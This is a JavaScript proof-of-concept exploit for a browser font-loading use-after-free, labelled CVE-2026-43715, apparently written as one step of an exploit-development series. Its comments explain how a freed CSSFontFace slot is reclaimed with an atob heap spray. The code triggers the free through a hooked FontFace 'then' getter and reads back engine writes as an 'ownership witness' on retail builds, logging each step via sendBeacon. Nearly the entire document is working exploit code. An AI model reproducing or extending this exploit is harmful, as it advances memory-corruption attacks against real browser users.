// c041: CVE-2026-43715 with attacker-chosen bytes in the freed slot (atob container), and a readback.
//
// An 8-bit StringImpl of 172 characters is exactly 192 bytes (header tailOffset = 0x14), the size of the
// victim CSSFontFace. Decoded with atob so every byte is ours. All-zero fill makes the fake WeakHashSet at
// m_clients (+0x58) read empty, which is what lets the engine reach m_status = newStatus (+0x82) instead of
// faulting on a garbage client set. After the call we scan the same strings: a changed character means the
// engine wrote into memory we own and we can read it back from JS - the ownership witness, on retail.
(function(){

function send(s){ try { navigator.sendBeacon('/beacon', 'c041-' + String(s)); } catch(e){} }
function faceOf(fam){
  var f=null; try { document.fonts.forEach(function(x){ if(String(x.family).replace(/['"]/g,'')===fam) f=x; }); } catch(e){}
  return f;
}

  send('boot');
  var N = 400, LEN = 172;
  var b64 = null;
  try {
    var a = new Array(LEN); for (var i=0;i<LEN;i++) a[i]=0;
    b64 = btoa(String.fromCharCode.apply(null, a));
  } catch(e){ send('b64-fail'); }
  var hold = [];
  try {
    var v = document.createElement('style'); v.id='v'; v.textContent='x{}';
    var f = document.createElement('style'); f.id='f';
    f.textContent='@font-face { font-family: t; src: local("Arial"); }';
    document.head.appendChild(v); document.head.appendChild(f);
    document.body.offsetHeight;
    var face = faceOf('t');
    send('face=' + (face ? 'found' : 'missing'));
    if (!face) return;
    try { void face.loaded; } catch(e){}
    Object.defineProperty(FontFace.prototype, 'then', { get: function(){
      send('getter-enter');
      try { var e=document.getElementById('v'); if(e) e.remove(); } catch(err){}
      try { void document.body.offsetHeight; send('layout'); } catch(err){}
      for (var k=0;k<N;k++){ try { hold.push(atob(b64)); } catch(err){ break; } }
      send('sprayed=' + hold.length);
      return undefined;
    }, configurable: true });
    send('calling-load');
    face.load();
    send('load-returned');
    setTimeout(function(){
      var hit=-1, at=-1, val=-1;
      for (var i=0;i<hold.length && hit<0;i++){
        for (var j=0;j<hold[i].length;j++){
          var c = hold[i].charCodeAt(j);
          if (c !== 0){ hit=i; at=j; val=c; break; }
        }
      }
      send(hit>=0 ? ('RECLAIMED idx='+hit+' at='+at+' val='+val) : 'no-change n='+hold.length);
      send('ALIVE-2s');
    }, 500);
  } catch(e){ send('outer:' + e.name); }
})();
